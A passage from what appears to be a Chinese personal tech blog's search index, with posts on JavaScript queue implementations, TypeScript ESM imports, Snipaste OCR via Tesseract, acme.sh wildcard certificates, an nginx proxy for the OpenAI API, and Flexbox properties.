&#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从队列尾部删除元素</span></span><br><span class="line">    <span class="title function_">delBack</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> item = <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">end</span> - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">delete</span> <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">end</span> - <span class="number">1</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">end</span>--;</span><br><span class="line">            <span class="keyword">return</span> item;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回队列头部元素</span></span><br><span class="line">    <span class="title function_">peekFront</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回队列尾部元素</span></span><br><span class="line">    <span class="title function_">peekBack</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">queue</span>[<span class="variable language_">this</span>.<span class="property">end</span> - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">isEmpty</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">size</span>() === <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">size</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">end</span> - <span class="variable language_">this</span>.<span class="property">start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">queue</span> = &#123;&#125;;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">start</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">end</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="variable language_">this</span>.<span class="property">start</span>; index &lt; <span class="variable language_">this</span>.<span class="property">end</span>; index++) &#123;</span><br><span class="line">            str += <span class="variable language_">this</span>.<span class="property">queue</span>[index] + <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>队列的应用</h1>
<h2 id="击鼓传花游戏">击鼓传花游戏</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 击鼓传花游戏</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">game</span>(<span class="params">list: <span class="built_in">Array</span>&lt;<span class="built_in">string</span>&gt;, num: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> queue = <span class="keyword">new</span> <span class="title function_">objectQueue</span>();</span><br><span class="line">    <span class="comment">// 先把人员入栈</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; list.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        queue.<span class="title function_">enqueue</span>(list[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 停止条件是 队列中只有一个元素</span></span><br><span class="line">    <span class="keyword">while</span> (queue.<span class="title function_">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">            <span class="comment">// 将队列头部的元素添加到队尾</span></span><br><span class="line">            queue.<span class="title function_">enqueue</span>(queue.<span class="title function_">dequeue</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 循环结束队头的就是出局者</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(queue.<span class="title function_">dequeue</span>() + <span class="string">&quot;淘汰了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 只有一个元素的话 这就是获胜者</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(queue.<span class="title function_">dequeue</span>() + <span class="string">&quot;胜利&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">game</span>([<span class="string">&quot;tim&quot;</span>, <span class="string">&quot;tom&quot;</span>, <span class="string">&quot;jack&quot;</span>, <span class="string">&quot;nana&quot;</span>, <span class="string">&quot;tina&quot;</span>], <span class="number">7</span>);</span><br></pre></td></tr></table></figure>
<h2 id="检查回文数-双端队列">检查回文数 (双端队列)</h2>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 回文数检查</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">str: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 全部转小写, 去掉空格</span></span><br><span class="line">    str = str.<span class="title function_">toLocaleLowerCase</span>().<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>).<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;处理后的字符串:&quot;</span> + str);</span><br><span class="line">    <span class="comment">// 将字符串加入队列</span></span><br><span class="line">    <span class="keyword">const</span> que = <span class="keyword">new</span> <span class="title function_">doubleQueue</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        que.<span class="title function_">addBack</span>(str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> tag = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 取出首尾元素进行对比</span></span><br><span class="line">    <span class="keyword">while</span> (que.<span class="title function_">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (que.<span class="title function_">delFront</span>() != que.<span class="title function_">delBack</span>()) &#123;</span><br><span class="line">            tag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(tag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>(<span class="string">&quot;abc dc bA&quot;</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>javaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>TS+ESM项目导入自定义模块不加扩展名就报错的问题</title>
    <url>/20230306/TS+ESM%E9%A1%B9%E7%9B%AE%E5%AF%BC%E5%85%A5%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A8%A1%E5%9D%97%E4%B8%8D%E5%8A%A0%E6%8B%93%E5%B1%95%E5%90%8D%E5%B0%B1%E6%8A%A5%E9%94%99%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>折腾了两个小时，我基本弄明白了如何在 TypeScript 中使用自定义的 ESM 模块。</p>
<p>一开始以为直接导入文件名就行，不需要扩展名。但是，这样使用 TSC 编译出来之后运行报错，因为 ESM 规范要求导入自定义模块必须带有扩展名。然而，TSC 编译出来的项目中导入模块是不带扩展名的，所以 Node.js 会报错。</p>
<p>于是，我想当然地写了 <code>import router from &quot;./router.ts&quot;;</code>，认为 TypeScript 会自动处理扩展名。然而，并不是这样的。</p>
<p>TypeScript 直接不允许导入 <code>.ts</code> 后缀的文件，要求启用 <code>allowImportingTsExtensions</code>。但是加了这个选项之后，出现了更多的错误：</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">error <span class="title class_">TS2691</span>: <span class="title class_">An</span> <span class="keyword">import</span> path cannot end <span class="keyword">with</span> a <span class="string">&#x27;.ts&#x27;</span> extension. <span class="title class_">Consider</span> importing <span class="string">&#x27;./router.js&#x27;</span> instead.</span><br><span class="line">error <span class="title class_">TS2835</span>: <span class="title class_">Relative</span> <span class="keyword">import</span> paths need explicit file extensions <span class="keyword">in</span> <span class="title class_">EcmaScript</span> imports when <span class="string">&#x27;--moduleResolution&#x27;</span> is <span class="string">&#x27;node16&#x27;</span> or <span class="string">&#x27;nodenext&#x27;</span>. <span class="title class_">Did</span> you mean <span class="string">&#x27;./event.js&#x27;</span>?</span><br></pre></td></tr></table></figure>
<p>关于这个问题，在 GitHub 上有相关的讨论：<a href="https://github.com/microsoft/TypeScript/issues/16577">https://github.com/microsoft/TypeScript/issues/16577</a></p>
<h1>解决方案</h1>
<ol>
<li class="lvl-3">
<p>在 <code>tsconfig.json</code> 中将 <code>moduleResolution</code> 设置为 <code>nodenext</code>。设置之后，VS Code 导入模块时会自动加上 <code>.js</code> 后缀。</p>
</li>
<li class="lvl-3">
<p>使用 <code>import router from &quot;./router.js&quot;;</code>，注意这里扩展名为 <code>.js</code>。</p>
</li>
</ol>
<p>实际上，上面的报错也说明了问题：“An import path cannot end with a ‘.ts’ extension. Consider importing ‘./router.js’ instead.”（导入路径不能以 <code>.ts</code> 结尾，考虑导入 ‘./router.js’）</p>
<p>非常坑啊有没有，明明是 TypeScript，为什么要导入 JavaScript 呢？</p>
<p>ChatGPT 给出了解释：</p>
<blockquote>
<p>您在 TypeScript 中导入模块时，使用的是相对路径或绝对路径来引用另一个文件。这与 JavaScript 中的导入语句类似。</p>
<p>当 TypeScript 编译器将 TypeScript 代码转换为 JavaScript 代码时，它会自动将 <code>.ts</code> 扩展名更改为 <code>.js</code> 扩展名，并生成一个新的 JavaScript 文件，其中包含编译后的 JavaScript 代码。</p>
<p>因此，即使您在 TypeScript 代码中导入的是 <code>.ts</code> 文件，最终在运行时实际上会加载并执行 <code>.js</code> 文件，因此需要在导入语句中指定 <code>.js</code> 扩展名。</p>
</blockquote>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>typeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>搭配tesseract-ocr在Snipaste中支持ocr[需高级版]</title>
    <url>/20230310/%E6%90%AD%E9%85%8Dtesseract-ocr%E5%9C%A8Snipaste%E4%B8%AD%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/</url>
    <content><![CDATA[<p>Snipaste 是一款非常好用的截图软件, 但是却缺少了一个非常重要的功能–ocr</p>
<p>在作者帮助下, 我成功的让 Snipaste 支持了 ocr 功能, 此功能需要高级版的 [自定义命令] 功能搭配 <code>tesseract-ocr</code> 实现 ocr 功能, 而且体验很好</p>
<img src="/20230310/%E6%90%AD%E9%85%8Dtesseract-ocr%E5%9C%A8Snipaste%E4%B8%AD%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/%E6%BC%94%E7%A4%BAocr%E6%95%88%E6%9E%9C.gif" class="" title="演示ocr效果">
<h3 id="此方案速度略慢而且需要安装第三方软件-如不想安装请参考下列其余方案">此方案速度略慢而且需要安装第三方软件, 如不想安装请参考下列其余方案</h3>
<table>
<thead>
<tr>
<th>方案</th>
<th>OCR 工具</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://cuijunyu.win/20230310/%E6%90%AD%E9%85%8Dtesseract-ocr%E5%9C%A8Snipaste%E4%B8%AD%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/">方案 1</a></td>
<td>Tesseract-ocr</td>
<td>离线操作，支持各种系统</td>
<td>速度稍慢，准确度一般</td>
</tr>
<tr>
<td><a href="https://cuijunyu.win/20230421/%E4%BD%BF%E7%94%A8win10%E8%87%AA%E5%B8%A6%E6%9C%AC%E5%9C%B0ocr-api%E8%AE%A9Snipaste%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/">方案 2</a></td>
<td>Windows.Media.Ocr.Cli</td>
<td>离线使用，速度极快</td>
<td>只支持 Win10 以上系统，准确度逊于 Tesseract-ocr</td>
</tr>
<tr>
<td><a href="https://cuijunyu.win/20230421/Snipaste-OCR%E7%AF%873-%E4%BD%BF%E7%94%A8%E7%99%BE%E5%BA%A6api%E5%AE%9E%E7%8E%B0%E5%87%86%E7%A1%AE%E5%BA%A6%E6%9B%B4%E5%A5%BD%E7%9A%84ocr/">方案 3</a></td>
<td>百度 OCR 在线识别</td>
<td>准确度较高</td>
<td>需要网络，速度较慢</td>
</tr>
</tbody>
</table>
<h1>配置过程</h1>
<ol>
<li class="lvl-4">
<p>前往 <a href="https://digi.bib.uni-mannheim.de/tesseract/">https://digi.bib.uni-mannheim.de/tesseract/</a> 下载安装最新版<code>​ tesseract-ocr</code>,</p>
<ol>
<li class="lvl-7">安装过程中, 选择中文识别包 <img src="/20230310/%E6%90%AD%E9%85%8Dtesseract-ocr%E5%9C%A8Snipaste%E4%B8%AD%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/%E5%AE%89%E8%A3%85.png" class="" title="安装"></li>
</ol>
</li>
<li class="lvl-4">
<p>安装完成之后, 可以使用如下命令进行本地 ocr:</p>
<p>1.<code> tesseract &lt;需 ocr 的图像&gt; &lt;输出文件位置, 注意不需要写扩展名&gt; -c preserve_interword_spaces=1 --oem 1 --psm 1 -l eng+chi_sim</code></p>
<p>其中<code>-c preserve_interword_spaces=1 --oem 1 --psm 1 -l eng+chi_sim</code> 为识别参数, <code>preserve_interword_spaces=1</code>可以去掉多余的空格, <code>-l eng+chi_sim</code> 是指定识别语言</p>
</li>
<li class="lvl-4">
<p>打开 Snipaste 的首选项-控制, 点击添加新命令</p>
<ol>
<li class="lvl-7">
<img src="/20230310/%E6%90%AD%E9%85%8Dtesseract-ocr%E5%9C%A8Snipaste%E4%B8%AD%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/%E9%85%8D%E7%BD%AE1.png" class="" title="配置1">
</li>
<li class="lvl-7">
<img src="/20230310/%E6%90%AD%E9%85%8Dtesseract-ocr%E5%9C%A8Snipaste%E4%B8%AD%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/%E9%85%8D%E7%BD%AE2.png" class="" title="配置2">
</li>
</ol>
</li>
<li class="lvl-4">
<p>名称随意填写, 命令填写如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snip -o &quot;D:\Temp\source.png&quot;;exec(cmd /c &quot;C:\Program Files\Tesseract-OCR\tesseract.exe&quot;  &quot;D:\Temp\source.png&quot; &quot;D:\Temp\ocrRes&quot; -c preserve_interword_spaces=1 --oem 1 --psm 1 -l eng+chi_sim &amp;&amp;  notepad &quot;D:\Temp\ocrRes.txt&quot;);</span><br></pre></td></tr></table></figure>
<p>这段命令的含义是首先调用 Snipaste 截图并存放于<code>D:\Temp\source.png</code>, 然后执行 cmd 命令, 调用<code>tesseract</code>进行 ocr 识别, 并将识别结果用记事本打开 其中, **<code>C:\Program Files\Tesseract-OCR\tesseract.exe</code>**为你的<code>tesseract</code>安装路径, <code>D:\Temp\ocrRes</code>为 ocr 结果的文件路径, 注意只需要写文件名, 不需要拓展名, 文件名和路径请根据自己需要修改</p>
</li>
<li class="lvl-4">
<p>随后指定一个快捷键即可愉快的 OCR 啦 !! 😋😋😋😋😋</p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件技巧</category>
      </categories>
      <tags>
        <tag>ocr</tag>
        <tag>snipaste</tag>
      </tags>
  </entry>
  <entry>
    <title>通过Acme.sh + CloudFlare Dns认证申请泛域名证书</title>
    <url>/20230120/%E9%80%9A%E8%BF%87Acme-sh-CloudFlare-Dns%E8%AE%A4%E8%AF%81%E7%94%B3%E8%AF%B7%E6%B3%9B%E5%9F%9F%E5%90%8D%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<p>使用 <a href="http://acme.sh">acme.sh</a> 这个神器, 可以快速的申请泛域名证书, 省去繁琐的手动申请的步骤</p>
<p>由于我的域名使用了 CloudFlare Dns , 所以我用了 CloudFlare 的 api 认证方式</p>
<h2 id="使用步骤">使用步骤</h2>
<ul class="lvl-0">
<li class="lvl-4">
<p>首先在 CloudFlare 控制面板中获取 api key ,此处不多赘述</p>
</li>
<li class="lvl-4">
<p>设置环境变量</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export CF_Key=&quot;cloudflare申请的apikey&quot;</span><br><span class="line">export CF_Email=&quot;你的邮箱&quot;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-4">
<p>使用 <a href="http://acme.sh">acme.sh</a> 注册 acme 账号</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acme.sh --register-account -m 你的邮箱</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-4">
<p>使用 <a href="http://acme.sh">acme.sh</a> 快速申请泛域名证书, 并安装到 nginx 路径</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acme.sh --issue -d &quot;cuijunyu.win&quot; -d &quot;*.cuijunyu.win&quot; --dns dns_cf \</span><br><span class="line">--key-file       /etc/nginx/ssl/cuijunyu.key  \</span><br><span class="line">--fullchain-file /etc/nginx/ssl/cuijunyu.pem \</span><br><span class="line">--reloadcmd &quot;nginx -s reload&quot;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-4">
<p>删除已安装的证书</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acme.sh --remove -d cuijunyu.win -d &quot;*.cuijunyu.win&quot;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-4">
<p>更新已存在的证书</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acme.sh --renew -d cuijunyu.win --force</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>CloudFlare</tag>
      </tags>
  </entry>
  <entry>
    <title>ts-node调试ESM项目提示[ERR_UNKNOWN_FILE_EXTENSION]</title>
    <url>/20230307/ts-node%E8%B0%83%E8%AF%95ESM%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>如果直接使用 ts-node 运行开启了 ESM 的项目, 会提示未知扩展名</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">PS</span> <span class="attr">C</span>:\学习\前端\<span class="title class_">VoiceGPT</span>\voiceGPT-backend&gt; ts-node .\src\index.<span class="property">ts</span></span><br><span class="line"><span class="title class_">TypeError</span> [<span class="variable constant_">ERR_UNKNOWN_FILE_EXTENSION</span>]: <span class="title class_">Unknown</span> file extension <span class="string">&quot;.ts&quot;</span> <span class="keyword">for</span> <span class="attr">C</span>:\学习\前端\<span class="title class_">VoiceGPT</span>\voiceGPT-backend\src\index.<span class="property">ts</span></span><br><span class="line">    at <span class="keyword">new</span> <span class="title class_">NodeError</span> (<span class="attr">node</span>:internal/<span class="attr">errors</span>:<span class="number">399</span>:<span class="number">5</span>)</span><br><span class="line">    at <span class="title class_">Object</span>.<span class="property">getFileProtocolModuleFormat</span> [<span class="keyword">as</span> <span class="attr">file</span>:] (<span class="attr">node</span>:internal/modules/esm/<span class="attr">get_format</span>:<span class="number">79</span>:<span class="number">11</span>)</span><br><span class="line">    at defaultGetFormat (<span class="attr">node</span>:internal/modules/esm/<span class="attr">get_format</span>:<span class="number">121</span>:<span class="number">38</span>)</span><br><span class="line">    at defaultLoad (<span class="attr">node</span>:internal/modules/esm/<span class="attr">load</span>:<span class="number">81</span>:<span class="number">20</span>)</span><br><span class="line">    at nextLoad (<span class="attr">node</span>:internal/modules/esm/<span class="attr">loader</span>:<span class="number">163</span>:<span class="number">28</span>)</span><br><span class="line">    at <span class="title class_">ESMLoader</span>.<span class="property">load</span> (<span class="attr">node</span>:internal/modules/esm/<span class="attr">loader</span>:<span class="number">605</span>:<span class="number">26</span>)</span><br><span class="line">    at <span class="title class_">ESMLoader</span>.<span class="property">moduleProvider</span> (<span class="attr">node</span>:internal/modules/esm/<span class="attr">loader</span>:<span class="number">457</span>:<span class="number">22</span>)</span><br><span class="line">    at <span class="keyword">new</span> <span class="title class_">ModuleJob</span> (<span class="attr">node</span>:internal/modules/esm/<span class="attr">module_job</span>:<span class="number">64</span>:<span class="number">26</span>)</span><br><span class="line">    at <span class="title class_">ESMLoader</span>.#createModuleJob (<span class="attr">node</span>:internal/modules/esm/<span class="attr">loader</span>:<span class="number">480</span>:<span class="number">17</span>)</span><br><span class="line">    at <span class="title class_">ESMLoader</span>.<span class="property">getModuleJob</span> (<span class="attr">node</span>:internal/modules/esm/<span class="attr">loader</span>:<span class="number">434</span>:<span class="number">34</span>) &#123;</span><br><span class="line">  <span class="attr">code</span>: <span class="string">&#x27;ERR_UNKNOWN_FILE_EXTENSION&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解决方法: 将运行命令改为</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">ts-node --esm .\src\index.<span class="property">ts</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>typeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>通过nginx反代openai api</title>
    <url>/20230306/%E9%80%9A%E8%BF%87nginx%E5%8F%8D%E4%BB%A3openai-api/</url>
    <content><![CDATA[<p>最近 openai 发布了 chatGPT 同款的 GPT-3.5 trubo API, 并且价格十分低廉, 正当大家跃跃欲试的时候却发现 GFW 却已经先我们一步了…</p>
<span id="more"></span>
<p>那么解决方案也很简单, 首先你需要一台安装了 nginx 境外服务器, 然后配置如下即可使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">	listen 8443 ssl;</span><br><span class="line">	server_name openai.example.com;</span><br><span class="line">	ssl_certificate /etc/nginx/ssl/cuijunyu.pem;</span><br><span class="line">	ssl_certificate_key /etc/nginx/ssl/cuijunyu.key;</span><br><span class="line">        ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">	location / &#123;</span><br><span class="line">		proxy_pass https://api.openai.com/;</span><br><span class="line">		proxy_set_header Host api.openai.com;</span><br><span class="line">		proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>请求 api 的时候, 你只需要把 URL 换成 <a href="http://openai.example.com">openai.example.com</a> 就可以了</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>openai</tag>
      </tags>
  </entry>
  <entry>
    <title>FlexBox总结</title>
    <url>/20230419/FlexBox%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>Flex 布局有两种属性: 容器属性/项目属性</p>
<h1>容器属性</h1>
<h2 id="flex-direction-主轴方向"><code>flex-direction</code> 主轴方向</h2>
<p>取值:</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>row: 水平, 默认</p>
</li>
<li class="lvl-4">
<p>row-reverse: 水平, 从右往左</p>
</li>
<li class="lvl-4">
<p>column: 垂直</p>
</li>
<li class="lvl-4">
<p>column: 垂直, 从下往上</p>
</li>
</ul>
<h2 id="flex-wrap-项目换行"><code>flex-wrap</code> 项目换行</h2>
<p>取值</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>nowrap: 不换行, 默认</p>
</li>
<li class="lvl-4">
<p>wrap: 换行</p>
</li>
<li class="lvl-4">
<p>wrap-reverse: 反向换行, 表现得与<code>align-items</code>设置为<code>flex-end</code>类似</p>
</li>
</ul>
<p>当启用换行时, 每一行都有一个主轴</p>
<h3 id="flex-flow-主轴方向和项目换行的简写"><code>flex-flow</code> 主轴方向和项目换行的简写</h3>
<p><code>flex-flow: &lt;flex-direction&gt; &lt;flex-wrap&gt;;</code></p>
<h2 id="justify-content-主轴对齐方式"><code>justify-content</code> 主轴对齐方式</h2>
<p>取值</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>flex-start: 主轴开头, 默认</p>
</li>
<li class="lvl-4">
<p>flex-end: 主轴末尾</p>
</li>
<li class="lvl-4">
<p>center: 主轴中心</p>
</li>
<li class="lvl-4">
<p>space-between: 两侧无间距, 项目之间间距相同</p>
</li>
<li class="lvl-4">
<p>space-around: 两侧间距较小, 项目之间间距相同</p>
</li>
</ul>
<h2 id="align-items-交叉轴对齐方式"><code>align-items</code> 交叉轴对齐方式</h2>
<p>取值</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>flex-start: 交叉轴开头, 默认</p>
</li>
<li class="lvl-4">
<p>flex-end: 交叉轴末尾</p>
</li>
<li class="lvl-4">
<p>center: 交叉轴中心</p>
</li>
<li class="lvl-4">
<p>stretch: 拉伸到可用宽度</p>
</li>
<li class="lvl-4">
<p>baseline: 基线对齐</p>
</li>
</ul>
<h2 id="align-content-多行交叉轴对齐方式"><code>align-content</code> 多行交叉轴对齐方式</h2>
<p>取值</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>flex-start: 交叉轴开头, 默认</p>
</li>
<li class="lvl-4">
<p>flex-end: 交叉轴末尾</p>
</li>
<li class="lvl-4">
<p>center: 交叉轴中心</p>
</li>
<li class="lvl-4">
<p>stretch: 拉伸到可用宽度</p>
</li>
<li class="lvl-4">
<p>space-between: 两侧无间距, 项目之间间距相同</p>
</li>
<li class="lvl-4">
<p>space-around: 两侧间距较小, 项目之间间距相同</p>
</li>
</ul>
<h2 id="注意点">注意点:</h2>
<ul class="lvl-0">
<li class="lvl-4">
<p>如果启用换行, 那么<code>align-content</code>生效, 否则无效</p>
</li>
<li class="lvl-4">
<p>如果启用换行, 只有<code>align-content</code>为<code>stretch</code>时, <code>align-items</code>才会生效</p>
</li>
</ul>
<h1>项目属性</h1>
<h2 id="order-项目顺序">order 项目顺序</h2>
<h2 id="order-项目排列顺序">order 项目排列顺序</h2>
<p>取值：整数，越小越靠前，默认为 0。</p>
<h2 id="flex-grow-项目放大比例">flex-grow 项目放大比例</h2>
<p>取值：数字，默认为 0。</p>
<h2 id="flex-shrink-项目收缩比例">flex-shrink 项目收缩比例</h2>
<p>取值：数字，默认为 1。</p>
<h2 id="flex-basis-项目占据主轴的空间大小">flex-basis 项目占据主轴的空间大小</h2>
<p>取值：</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>默认值: 自适应空间</p>
</li>
<li class="lvl-4">
<p>固定尺寸(如 100px)</p>
</li>
</ul>
<h2 id="flex-简写属性">flex 简写属性</h2>
<p>设置<code>flex-grow</code>、<code>flex-shrink</code>和<code>flex-basis</code>三个属性的值。默认值为<code>0 1 auto</code>。</p>
<h2 id="align-self-指定单个项目在交叉轴上的对齐方式">align-self 指定单个项目在交叉轴上的对齐方式</h2>
<p>取值：与<code>align-items</code>取值相同（但会覆盖其），也包括其余有效的 CSS 属性值（justify-content, align-content 等）</p>
<p>取值: 数字, 默认为 0</p>
<p>项目按照数字从小到大排序</p>
<h2 id="flex-grow-项目的增长比例">flex-grow 项目的增长比例</h2>
<p>取值: 数字, 默认为 0</p>
<p>项目如何占据剩余可用空间, 设置为 0 不占用</p>
<h2 id="flex-shrink-项目的缩小比例">flex-shrink 项目的缩小比例</h2>
<p>取值: 数字, 默认为 1</p>
]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Flex</tag>
      </tags>
  </entry>
  <entry>
    <title>使用win10自带本地ocr让Snipaste实现快速识别文字 [需高级版]</title>
    <url>/20230421/%E4%BD%BF%E7%94%A8win10%E8%87%AA%E5%B8%A6%E6%9C%AC%E5%9C%B0ocr-api%E8%AE%A9Snipaste%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/</url>
    <content><![CDATA[<p>这是上篇文章<a href="https://cuijunyu.win/20230310/%E6%90%AD%E9%85%8Dtesseract-ocr%E5%9C%A8Snipaste%E4%B8%AD%E6%94%AF%E6%8C%81ocr-%E9%9C%80%E9%AB%98%E7%BA%A7%E7%89%88/">搭配 tesseract-ocr 在 Snipaste 中支持 ocr[需高级版]</a>的第二种解决方案</p>
<p>上一篇文章介绍了使用 tesseract-ocr 实现的方法, 他的识别速度略慢, 而且需要安装第三方软件, 这里介绍一种使用 windows 自带的 ocr 实现的方法, 而且速度 非! 常! 快!</p>
<blockquote>
